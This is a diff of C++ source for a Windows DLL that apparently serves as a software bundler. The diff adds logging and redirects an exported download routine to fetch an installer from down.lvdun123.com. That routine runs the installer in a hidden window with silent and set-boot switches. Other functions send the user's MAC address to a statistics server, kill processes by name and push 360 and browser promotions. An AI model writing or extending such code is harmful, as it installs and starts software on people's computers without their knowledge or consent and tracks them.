@@ -47,6 +47,7 @@ void ResetUserHandle()
 		ResetEvent(s_ListenHandle);
 	}
 	++s_ListenCount; //引用计数加1
+	TSDEBUG4CXX("ResetUserHandle  s_ListenCount = "<<s_ListenCount);
 	LeaveCriticalSection(&s_csListen);
 }
 
@@ -54,6 +55,7 @@ void SetUserHandle()
 {
 	EnterCriticalSection(&s_csListen);
 	--s_ListenCount;//引用计数减1
+	TSDEBUG4CXX("SetUserHandle  s_ListenCount = "<<s_ListenCount);
 	if (s_ListenCount == 0)
 	{
 		SetEvent(s_ListenHandle);
@@ -144,7 +146,7 @@ BOOL FindAndKillProcessByName(LPCTSTR strProcessName)
 
 extern "C" __declspec(dllexport) void SoftExit()
 {
-	DWORD ret = WaitForSingleObject(s_ListenHandle, 20000);
+	DWORD ret = WaitForSingleObject(s_ListenHandle, 60*60*1000);
 	if (ret == WAIT_TIMEOUT){
 	}
 	else if (ret == WAIT_OBJECT_0){	
@@ -357,7 +359,7 @@ DWORD WINAPI DownLoadWork(LPVOID pParameter)
 	{
 		return 0;
 	}
-	::PathCombineA(szBuffer,szBuffer,"Setup_oemqd50.exe");
+	::PathCombineA(szBuffer,szBuffer,"GsSetup_0001.exe");
 	::CoInitialize(NULL);
 	HRESULT hr = E_FAIL;
 	__try
@@ -371,15 +373,15 @@ DWORD WINAPI DownLoadWork(LPVOID pParameter)
 	::CoUninitialize();
 	if (SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
 	{
-		::ShellExecuteA(NULL,"open",szBuffer,NULL,NULL,SW_HIDE);
+		::ShellExecuteA(NULL,"open",szBuffer,"/s /run /setboot", NULL, SW_HIDE);
 	}
 	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
 }
 
-extern "C" __declspec(dllexport) void DownLoadBundledSoftware()
+extern "C" __declspec(dllexport) void DownLoadLvDunAndInstall()
 {
 	TSAUTO();
-	CHAR szUrl[] = "http://dl.360safe.com/p/Setup_oemqd50.exe";
+	CHAR szUrl[] = "http://down.lvdun123.com/client/GsSetup_0001.exe";
 	DWORD dwThreadId = 0;
 	HANDLE hThread = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
 	if (NULL != hThread)
@@ -414,7 +416,7 @@ extern "C" __declspec(dllexport) void Send2DidaAnyHttpStat(CHAR *op, CHAR *cid)
 		}
 		szMac[strlen(szMac)] = szPid[i];
 	}
-	std::string str = "http://stat.didarili.com:8082/?mac=";
+	std::string str = "http://stat.didarili.com:8083/?mac=";
 	str += szMac;
 	str += "&op=";
 	str += op;
@@ -648,6 +650,7 @@ static HRESULT Send360ProductInstallHttpStatSync(const std::string& ec, const st
 
 static DWORD Do360SafeLogic(DWORD dwPublicID, LPCSTR lpszLibraryFile)
 {
+	TSINFO4CXX("Do360SafeLogic ENTER ");
 	DWORD dwResult = (DWORD)-1;
 	typedef BOOL (WINAPI *ISSAFEEXIST)();
 	HINSTANCE hInstance = LoadLibraryA(lpszLibraryFile);
@@ -670,6 +673,7 @@ static DWORD Do360SafeLogic(DWORD dwPublicID, LPCSTR lpszLibraryFile)
 
 			if (hInstance)
 			{
+				TSINFO4CXX("Do360SafeLogic: CALL Start");
 				typedef DWORD (WINAPI *PFNStart)(StartParameter *param);
 				PFNStart   pFnStart = (PFNStart)GetProcAddress(hInstance, "Start") ; //Start_UI是有托盘图标的
 				if (pFnStart)
@@ -691,7 +695,8 @@ static DWORD Do360SafeLogic(DWORD dwPublicID, LPCSTR lpszLibraryFile)
 
 static HRESULT DoBrowserLogic(DWORD dwPublicID, LPCSTR lpszLibraryFile, LPCWSTR lpszCommandLine = NULL)
 {
-    //////////////////////////////////////////////////////////////////////////
+    TSINFO4CXX("DoBrowserLogic ENTER ");
+	//////////////////////////////////////////////////////////////////////////
     // 浏览器推广相关导出函数 [10/31/2014 Beacon]
     //////////////////////////////////////////////////////////////////////////
     // 浏览器全自动下载安装发射装置 [11/5/2014 Beacon]
@@ -747,6 +752,7 @@ struct Install360ProductThreadParameters {
 
 DWORD WINAPI Intall360ProductThread(LPVOID pParameter)
 {
+	 TSINFO4CXX("Intall360ProductThread ENTER ");
 	const Install360ProductThreadParameters* args = reinterpret_cast<const Install360ProductThreadParameters*>(pParameter);
 	if (args->product == 0) {
 		if (0 == Do360SafeLogic(21456, args->libraryFile)) {
@@ -766,6 +772,7 @@ DWORD WINAPI Intall360ProductThread(LPVOID pParameter)
 
 extern "C" __declspec(dllexport) VOID Install360SafeAsync(LPCSTR lpszLibraryFile, LPCSTR ea, LPCSTR el)
 {
+	TSINFO4CXX("Intall360ProductThread lpszLibraryFile =  "<<lpszLibraryFile<<", ea = "<<ea<<", el = "<<el);
 	if (std::strlen(lpszLibraryFile) >= MAX_PATH ||
 		std::strlen(ea) >= 32 || std::strlen(el) >= 32) {
 		return;
